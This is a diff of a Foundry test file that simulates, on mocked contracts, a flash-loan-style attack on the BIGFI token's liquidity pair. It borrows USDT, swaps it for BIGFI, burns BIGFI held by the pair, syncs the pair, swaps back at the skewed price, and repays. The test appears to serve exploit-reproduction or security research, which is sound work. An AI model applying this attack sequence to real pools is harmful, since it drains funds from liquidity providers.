@@ -23,7 +23,7 @@ contract BIGFITest is Test, BlockLoader {
     address pairAddr;
     address factoryAddr;
     address routerAddr;
-    address attackContractAddr;
+    address attackerAddr;
     uint256 blockTimestamp = 1679488640;
     uint112 reserve0pair = 107480664198219600542112;
     uint112 reserve1pair = 9310990259680030849404;
@@ -74,27 +74,19 @@ contract BIGFITest is Test, BlockLoader {
         router = new UniswapV2Router(address(factory), address(0xdead));
         routerAddr = address(router);
         attackContract = new AttackContract();
-        attackContractAddr = address(attackContract);
+        attackerAddr = address(attacker);
         attacker = address(attackContract);
         // Initialize balances and mock flashloan.
         usdt.transfer(address(pair), balanceOfusdtpair);
         bigfi.transfer(address(pair), balanceOfbigfipair);
     }
 
+    modifier eurus() {
+        _;
+    }
+
     function printBalance(string memory tips) public {
         emit log_string(tips);
-        emit log_string("Bigfi Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(bigfi),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(bigfi),
-            address(bigfi),
-            bigfi.decimals()
-        );
-        emit log_string("");
         emit log_string("Usdt Balances: ");
         queryERC20BalanceDecimals(
             address(usdt),
@@ -104,6 +96,18 @@ contract BIGFITest is Test, BlockLoader {
         queryERC20BalanceDecimals(
             address(bigfi),
             address(usdt),
+            bigfi.decimals()
+        );
+        emit log_string("");
+        emit log_string("Bigfi Balances: ");
+        queryERC20BalanceDecimals(
+            address(usdt),
+            address(bigfi),
+            usdt.decimals()
+        );
+        queryERC20BalanceDecimals(
+            address(bigfi),
+            address(bigfi),
             bigfi.decimals()
         );
         emit log_string("");
@@ -119,15 +123,15 @@ contract BIGFITest is Test, BlockLoader {
             bigfi.decimals()
         );
         emit log_string("");
-        emit log_string("Attackcontract Balances: ");
+        emit log_string("Attacker Balances: ");
         queryERC20BalanceDecimals(
             address(usdt),
-            address(attackContract),
+            address(attacker),
             usdt.decimals()
         );
         queryERC20BalanceDecimals(
             address(bigfi),
-            address(attackContract),
+            address(attacker),
             bigfi.decimals()
         );
         emit log_string("");
@@ -139,104 +143,89 @@ contract BIGFITest is Test, BlockLoader {
         return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
     }
 
-    function nop(uint256 amount) internal pure {
-        return;
-    }
-
-    function borrow_owner_usdt(uint256 amount) internal {
+    function borrow_usdt_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         usdt.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_owner_usdt(uint256 amount) internal {
+    function payback_usdt_owner(uint256 amount) internal eurus {
         usdt.transfer(owner, amount);
     }
 
-    function borrow_owner_bigfi(uint256 amount) internal {
+    function borrow_bigfi_owner(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(owner);
         bigfi.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_owner_bigfi(uint256 amount) internal {
+    function payback_bigfi_owner(uint256 amount) internal eurus {
         bigfi.transfer(owner, amount);
     }
 
-    function borrow_pair_usdt(uint256 amount) internal {
+    function borrow_usdt_pair(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(pair));
         usdt.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_pair_usdt(uint256 amount) internal {
+    function payback_usdt_pair(uint256 amount) internal eurus {
         usdt.transfer(address(pair), amount);
     }
 
-    function borrow_pair_bigfi(uint256 amount) internal {
+    function borrow_bigfi_pair(uint256 amount) internal eurus {
         vm.stopPrank();
         vm.prank(address(pair));
         bigfi.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_pair_bigfi(uint256 amount) internal {
+    function payback_bigfi_pair(uint256 amount) internal eurus {
         bigfi.transfer(address(pair), amount);
     }
 
-    function swap_pair_usdt_bigfi(uint256 amount) internal {
-        usdt.approve(address(router), type(uint).max);
-        address[] memory path = new address[](2);
-        path[0] = address(usdt);
-        path[1] = address(bigfi);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            1,
-            path,
-            attacker,
-            block.timestamp
-        );
+    function swap_pair_attacker_usdt_bigfi(
+        uint256 amount,
+        uint256 amountOut
+    ) internal eurus {
+        usdt.transfer(address(pair), amount);
+        pair.swap(0, amountOut, attacker, new bytes(0));
     }
 
-    function swap_pair_bigfi_usdt(uint256 amount) internal {
-        bigfi.approve(address(router), type(uint).max);
-        address[] memory path = new address[](2);
-        path[0] = address(bigfi);
-        path[1] = address(usdt);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            1,
-            path,
-            attacker,
-            block.timestamp
-        );
+    function swap_pair_attacker_bigfi_usdt(
+        uint256 amount,
+        uint256 amountOut
+    ) internal eurus {
+        bigfi.transfer(address(pair), amount);
+        pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function sync_pair() internal {
-        pair.sync();
-    }
-
-    function burn_pair_bigfi(uint256 amount) internal {
+    function burn_bigfi_pair(uint256 amount) internal eurus {
         bigfi.burn(address(pair), amount);
+        pair.sync();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_owner_usdt(200000e18);
+        borrow_usdt_owner(0x1bc16d674ec80000);
         printBalance("After step0 ");
-        swap_pair_usdt_bigfi(usdt.balanceOf(attacker));
+        swap_pair_attacker_usdt_bigfi(
+            0xde0b6b3a7640000,
+            0x132d7ecdfd1af70
+        );
         printBalance("After step1 ");
-        burn_pair_bigfi(3260e18);
+        burn_bigfi_pair(0x1f8b0dee6cfaf200000);
         printBalance("After step2 ");
-        sync_pair();
+        swap_pair_attacker_bigfi_usdt(
+            0xde0b6b3a764000,
+            uint256(6304596058458841677824) * 99 / 100
+        );
         printBalance("After step3 ");
-        swap_pair_bigfi_usdt(bigfi.balanceOf(attacker));
+        payback_usdt_owner(0x29a2241af62c0000);
         printBalance("After step4 ");
-        payback_owner_usdt(200600e18);
-        printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
@@ -246,16 +235,17 @@ contract BIGFITest is Test, BlockLoader {
         uint256 amt1,
         uint256 amt2,
         uint256 amt3,
-        uint256 amt4
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
     ) public {
         vm.startPrank(attacker);
-        vm.assume(amt4 == (amt0 * 1003) / 1000);
-        borrow_owner_usdt(amt0);
-        swap_pair_usdt_bigfi(amt1);
-        burn_pair_bigfi(amt2);
-        sync_pair();
-        swap_pair_bigfi_usdt(amt3);
-        payback_owner_usdt(amt4);
+        vm.assume(amt6 >= (amt0 * 1003) / 1000);
+        borrow_usdt_owner(amt0);
+        swap_pair_attacker_usdt_bigfi(amt1, amt2);
+        burn_bigfi_pair(amt3);
+        swap_pair_attacker_bigfi_usdt(amt4, amt5);
+        payback_usdt_owner(amt6);
         assert(!attackGoal());
         vm.stopPrank();
     }
